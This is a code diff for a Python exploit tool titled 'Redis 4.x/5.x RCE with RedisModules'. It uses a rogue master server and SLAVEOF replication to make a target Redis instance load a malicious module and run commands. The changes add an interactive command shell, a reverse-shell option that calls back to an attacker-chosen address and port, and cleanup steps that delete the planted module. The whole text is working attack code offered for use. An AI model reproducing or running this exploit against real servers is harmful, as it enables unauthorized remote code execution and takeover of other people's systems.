@@ -3,6 +3,7 @@
 import socket
 import os
 import sys
+import re
 from time import sleep
 import argparse
 from six.moves import input
@@ -39,11 +40,11 @@ def din(sock, cnt):
             print("\033[1;34;40m[->]\033[0m {}".format(msg))
         else:
             print("\033[1;34;40m[->]\033[0m {}......{}".format(msg[:80], msg[-80:]))
-    try:
-        result = msg.decode()
-    except:
-        result = msg
-    return result
+    if sys.version_info < (3, 0):
+        res = re.sub(r'[^\x00-\x7f]', r'', msg)
+    else:
+        res = re.sub(b'[^\x00-\x7f]', b'', msg)
+    return res.decode()
 
 
 def dout(sock, msg):
@@ -70,6 +71,7 @@ class Remote:
         self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self._sock.connect((self._host, self._port))
 
+
     def send(self, msg):
         dout(self._sock, msg)
 
@@ -89,6 +91,11 @@ class Remote:
         buf = self.recv()
         return buf
 
+    def reverse_shell(self, addr, port):
+        self.send(mk_cmd("system.rev {} {}".format(addr, port)))
+        buf = self.recv()
+        return buf
+
 
 class RogueServer:
     def __init__(self, lhost, lport):
@@ -96,6 +103,7 @@ class RogueServer:
         self._port = lport
         self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self._sock.bind((self._host, self._port))
+        self._sock.settimeout(15)
         self._sock.listen(10)
 
     def handle(self, data):
@@ -121,9 +129,7 @@ class RogueServer:
     def exp(self):
         try:
             cli, addr = self._sock.accept()
-            back = self._sock.getsockname()
-            print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(back[0], back[1]))
-            self._sock.settimeout(10)
+            print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(addr[0], addr[1]))
             while True:
                 data = din(cli, 1024)
                 if len(data) == 0:
@@ -136,8 +142,21 @@ class RogueServer:
             print("\033[1;31;m[-]\033[0m Time out, Please check your local address.")
             exit()
 
+
+def reverse(remote):
+    print("[*] Open reverse shell...")
+    addr = input("[*] Reverse server address: ")
+    port = input("[*] Reverse server port: ")
+    r = remote.reverse_shell(addr, port)
+    if 'unknown command' in r:
+        print("\033[1;31;m[-]\033[0m Error, check your module!")
+        return
+    print("\033[92m[+]\033[0m Reverse shell payload sent.")
+    print("[*] Check at {}:{}".format(addr, port))
+
+
 def interact(remote):
-    print("\033[92m[+]\033[0m Received backconnect, use exit to exit...")
+    print("\033[92m[+]\033[0m Interactive shell open , use \"exit\" to exit...")
     try:
         while True:
             cmd = input("$ ")
@@ -145,54 +164,69 @@ def interact(remote):
             if cmd == "exit":
                 return
             r = remote.shell_cmd(cmd)
+            if 'unknown command' in r:
+                print("\033[1;31;m[-]\033[0m Error, check your module!")
+                return
             for l in decode_shell_result(r).split("\n"):
                 if l:
                     print(l)
     except KeyboardInterrupt:
         return
 
+def printback(remote):
+    back = remote._sock.getpeername()
+    print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(back[0], back[1]))
+
+
 
 def runserver(rhost, rport, lhost, lport):
-    print("[*] Listening on {}:{}".format(lhost, lport))
-    # expolit
-    expfile = os.path.basename(filename)
-    remote = Remote(rhost, rport)
-    if auth:
-        check = remote.do("AUTH {}".format(auth))
-        if "invalid password" in check:
-            print("\033[1;31;m[-]\033[0m Wrong password !")
-            return
-    else:
-        info = remote.do("INFO")
-        if "NOAUTH" in info:
-            print("\033[1;31;m[-]\033[0m Need password.")
-            return
-    print("[*] Sending SLAVEOF command to server")
-    remote.do("SLAVEOF {} {}".format(lhost, lport))
-    back = remote._sock.getsockname()
-    print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(back[0], back[1]))
-    print("[*] Setting filename")
-    remote.do("CONFIG SET dir /tmp/")
-    remote.do("CONFIG SET dbfilename {}".format(expfile))
-    sleep(2)
-    rogue = RogueServer(lhost, lport)
-    print("[*] Tring to run payload")
-    rogue.exp()
-    sleep(2)
-    remote.do("MODULE LOAD /tmp/{}".format(expfile))
-    remote.do("SLAVEOF NO ONE")
-    print("[*] Closing rogue server...")
-    rogue.close()
-    # Operations here
-    interact(remote)
+    #start exploit
+    try:
+        remote = Remote(rhost, rport)
+        if auth:
+            check = remote.do("AUTH {}".format(auth))
+            if "invalid password" in check:
+                print("\033[1;31;m[-]\033[0m Wrong password !")
+                return
+        else:
+            info = remote.do("INFO")
+            if "NOAUTH" in info:
+                print("\033[1;31;m[-]\033[0m Need password.")
+                return
 
-    # clean up
-    print("[*] Clean up..")
-    remote.do("CONFIG SET dbfilename dump.rdb")
-    remote.shell_cmd("rm /tmp/{}".format(expfile))
-    remote.do("MODULE UNLOAD system")
-    remote.close()
+        # get expolit filename
+        expfile = os.path.basename(filename)
+        print("[*] Sending SLAVEOF command to server")
+        remote.do("SLAVEOF {} {}".format(lhost, lport))
+        printback(remote)
+        print("[*] Setting filename")
+        remote.do("CONFIG SET dbfilename {}".format(expfile))
+        printback(remote)
+        sleep(2)
+        print("[*] Start listening on {}:{}".format(lhost, lport))
+        rogue = RogueServer(lhost, lport)
+        print("[*] Tring to run payload")
+        rogue.exp()
+        sleep(2)
+        remote.do("MODULE LOAD ./{}".format(expfile))
+        remote.do("SLAVEOF NO ONE")
+        print("[*] Closing rogue server...\n")
+        rogue.close()
+        # Operations here
+        choice = input("\033[92m[+]\033[0m What do u want ? [i]nteractive shell or [r]everse shell: ")
+        if choice.startswith("i"):
+            interact(remote)
+        elif choice.startswith("r"):
+            reverse(remote)
 
+        # clean up
+        print("[*] Clean up..")
+        remote.do("CONFIG SET dbfilename dump.rdb")
+        remote.shell_cmd("rm ./{}".format(expfile))
+        remote.do("MODULE UNLOAD system")
+        remote.close()
+    except Exception as e:
+        print("\033[1;31;m[-]\033[0m Error found : {} \n[*] Exit..".format(e))
 
 def main():
     parser = argparse.ArgumentParser(description='Redis 4.x/5.x RCE with RedisModules')
@@ -218,10 +252,7 @@ def main():
         print("\033[1;31;m[-]\033[0m Where you module? ")
         exit(0)
     payload = open(filename, "rb").read()
-    try:
-        runserver(options.rhost, options.rport, options.lhost, options.lport)
-    except Exception as e:
-        print("\033[1;31;m[-]\033[0m Error :{}, exit..".format(e))
+    runserver(options.rhost, options.rport, options.lhost, options.lport)
 
 
 if __name__ == '__main__':
